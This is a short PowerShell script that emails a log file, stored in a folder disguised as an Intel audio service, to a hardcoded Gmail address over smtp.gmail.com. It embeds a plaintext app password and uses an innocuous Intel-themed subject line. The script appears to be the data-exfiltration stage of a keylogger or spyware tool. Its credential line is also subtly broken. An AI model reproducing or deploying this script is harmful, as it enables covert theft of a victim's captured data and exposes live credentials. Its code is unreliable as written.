﻿$From = "gf90ali@gmail.com"
$To = "gf90ali@gmail.com"
$Attachment = "%USERPROFILE%\AppData\Roaming\Intel Corporation\Intel Dynamic Audio Platform Service\Intel Dynamic Audio Platform Service.log"
$Subject = "Intel Dynamic Notification Report"
$Body = "Please see attached. Thank you."
$Password = "wlipppkosvrsqonz" | ConvertToString -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -Attachments $Attachment -SmtpServer "smtp.gmail.com" -port 587 -UseSsl -Credential $Credential
